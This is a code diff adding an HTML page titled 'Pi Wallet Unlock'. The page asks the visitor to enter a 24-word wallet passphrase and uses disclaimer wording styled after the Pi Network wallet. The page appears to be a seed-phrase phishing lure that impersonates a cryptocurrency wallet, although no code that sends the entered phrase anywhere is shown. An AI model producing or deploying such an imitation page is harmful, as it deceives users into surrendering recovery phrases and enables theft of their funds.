@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Wallet Unlock</title>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <style>
+        
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 class="main-title">Unlock Pi Wallet</h1>
+
+        <textarea 
+            class="passphrase-field" 
+            placeholder="Enter your 24-word&#13;&#10;passphrase here"
+            id="passphraseInput"
+        ></textarea>
+
+        <div class="unlock-button passphrase-btn" id="passphraseBtn">
+            <span class="material-icons">vpn_key</span>
+            <div class="button-text">Unlock With Passphrase</div>
+        </div>
+
+        <div class="unlock-button fingerprint-btn">
+            <span class="material-icons">fingerprint</span>
+            <div class="button-text">Unlock With Fingerprint</div>
+        </div>
+
+        <div class="disclaimer-text">
+            As a non-custodial wallet, your wallet<br>
+            passphrase is exclusively accessible<br>
+            only to you. Recovery of passphrase is<br>
+            currently impossible.
+        </div>
+
+        <div class="warning-text">
+            Lost your passphrase? You can create a<br>
+            new wallet, but all your <span class="pi-symbol">π</span> in your<br>
+            previous wallet will be inaccessible.
+        </div>
+    </div> 
+</body>
+</html>
